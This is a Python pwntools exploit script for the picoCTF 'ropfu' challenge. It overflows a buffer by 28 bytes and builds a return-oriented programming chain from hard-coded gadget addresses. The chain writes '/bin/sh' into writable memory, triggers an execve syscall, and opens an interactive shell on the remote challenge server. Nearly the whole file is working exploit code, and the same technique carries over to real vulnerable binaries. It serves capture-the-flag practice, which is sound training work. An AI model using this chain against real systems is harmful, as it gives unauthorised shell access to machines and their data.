# picoCTF-ropfu-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 65454

    # variables
    offset = 28                         # length of buf + EBP
    pop_eax = 0x080b073a                # pop eax ; ret
    pop_edx_then_ebx = 0x080583b9       # pop edx ; pop ebx ; ret
    mov_dword_ptr_edx_eax = 0x080590f2  # mov dword ptr [edx], eax ; ret
    xor_ecx_syscall = 0x0804a73f        # xor ecx, ecx ; syscall
    write_bin = 0x80e57c0               # this is an address in '.data' that we can read from and write to
    write_sh = write_bin + 4

    payload = flat(
        cyclic(offset),

        # write "/bin" into memory
        p32(pop_eax),
        b"/bin",
        p32(pop_edx_then_ebx),
        p32(write_bin),
        p32(0),
        p32(mov_dword_ptr_edx_eax),

        # write "/sh\x00" into memory
        p32(pop_eax),
        b"/sh\x00",
        p32(pop_edx_then_ebx),
        p32(write_sh),
        p32(0),
        p32(mov_dword_ptr_edx_eax),

        # syscall
        p32(pop_eax),
        p32(0xb),
        p32(pop_edx_then_ebx),
        p32(0),
        p32(write_bin),
        p32(xor_ecx_syscall)
    )

    # connect to instance
    p = remote(host, port)

    # deliver payload
    p.recvline(timeout=1)
    p.sendline(payload)

    # interact with shell
    p.interactive()

if __name__ == "__main__":
    main()